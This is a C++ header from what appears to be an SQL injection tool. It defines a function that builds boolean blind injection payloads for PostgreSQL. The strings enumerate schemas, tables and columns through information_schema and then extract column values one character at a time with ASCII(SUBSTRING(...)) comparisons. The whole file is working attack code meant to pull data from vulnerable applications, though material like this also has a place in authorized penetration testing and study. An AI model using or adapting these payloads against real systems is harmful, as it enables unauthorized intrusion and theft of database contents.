#ifndef POSTGRESQL_BLIND_BASED
#define POSTGRESQL_BLIND_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct postgresql_blind_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                const int cmp = (*config[BLIND_BASED_CMP])[0];
                switch (type)
                {
                case DATABASES:
                        return "' OR CASE WHEN ASCII(SUBSTRING(("
                               "SELECT schema_name "
                               "FROM information_schema.schemata "
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                case TABLES:
                        return "' OR CASE WHEN ASCII(SUBSTRING(("
                               "SELECT table_name "
                               "FROM information_schema.tables "
                               "WHERE table_schema='" +
                               *config[BLIND_BASED_DATABASE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                case COLUMNS:
                        return "' OR CASE WHEN ASCII(SUBSTRING(("
                               "SELECT column_name "
                               "FROM information_schema.columns "
                               "WHERE table_schema='" +
                               *config[BLIND_BASED_DATABASE] + "' " +
                               "AND table_name='" +
                               *config[BLIND_BASED_TABLE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                case VALUES:
                        return "' OR CASE WHEN ASCII(SUBSTRING(( SELECT " +
                               *config[BLIND_BASED_COLUMN] + "::text " +
                               "FROM " + *config[BLIND_BASED_DATABASE] + "." +
                               *config[BLIND_BASED_TABLE] + " " +
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                default:
                        return std::string();
                }
        };
};
#endif